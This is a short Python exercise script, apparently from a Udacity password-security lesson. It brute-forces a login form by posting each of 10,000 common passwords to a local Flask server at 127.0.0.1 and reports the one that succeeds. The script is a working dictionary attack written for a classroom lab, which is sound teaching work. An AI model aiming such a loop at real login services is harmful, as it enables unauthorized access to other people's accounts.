'''
URL: https://classroom.udacity.com/nanodegrees/nd0044/parts/b91edf5c-5a4d-499a-ba69-a598afd9fe3e/modules/5606de9d-aa2b-4a1b-9b14-81b87d80a264/lessons/450352d6-5e7e-47e7-aa41-eae3dc4f3cea/concepts/9a1c6fb0-cbfb-482f-bbf6-937f1eed37a1

Chapter 4. Identity and Access Management
Lesson 3: Passwords
Part 4: Practice - Brute Force 
'''

# This method can be used to send a login post
# request to our server
# returns True if 200 success on login attempt
# returns False otherwise (failure, errors)
from flask import abort
import requests

# Load the NIST list of 10,000 most commonly used passwords (strings)
with open('nist_10000.txt', newline='') as bad_passwords:
    nist_bad = bad_passwords.read().split('\n')
print(nist_bad[1:10])

def try_password(password, print_all=False):
    # specify where to make the request
    url = 'http://127.0.0.1:5000/login'

    # define the payload for the post request
    payload = {'password': password}

    # make the request
    r = requests.post(url, json=payload)

    # print some results (http status code)
    if (print_all):
        print(payload['password'] + ": " + str(r.status_code))

    # determine if we have gained access 200 = success!
    if (r.status_code == 200):
        print('The password is: ' + payload['password'])
        return True
    else:
        return False

for loop in nist_bad:
    if(try_password(loop) == True):
        print("exited")
        abort(200)